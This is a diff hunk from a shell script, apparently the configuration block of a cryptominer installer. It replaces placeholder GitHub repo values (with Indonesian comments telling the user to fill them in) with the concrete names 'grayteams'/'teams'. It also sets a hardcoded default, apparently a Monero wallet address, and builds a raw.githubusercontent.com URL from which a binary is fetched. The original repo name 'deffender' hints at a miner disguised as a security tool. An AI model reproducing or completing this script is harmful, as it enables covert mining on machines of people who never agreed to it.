@@ -13,8 +13,8 @@
 
 set -eu
 
-REPO_USER="${REPO_USER:-KAMU}"              # <-- GANTI: username GitHub-mu
-REPO_NAME="${REPO_NAME:-deffender}"         # <-- GANTI: nama repo tempat binary di-host
+REPO_USER="${REPO_USER:-grayteams}"             
+REPO_NAME="${REPO_NAME:-teams}"         
 BRANCH="${BRANCH:-main}"
 WALLET="${WALLET:-86CqeAcomozQ67JJGm1cgEWZms56cLogui2hmg5QZr6TVAABiLLv47iYgirYZzz16s9doatnUb4CoRbcBi975sCN3XAXF2A}"
 BASE_URL="https://raw.githubusercontent.com/${REPO_USER}/${REPO_NAME}/${BRANCH}"
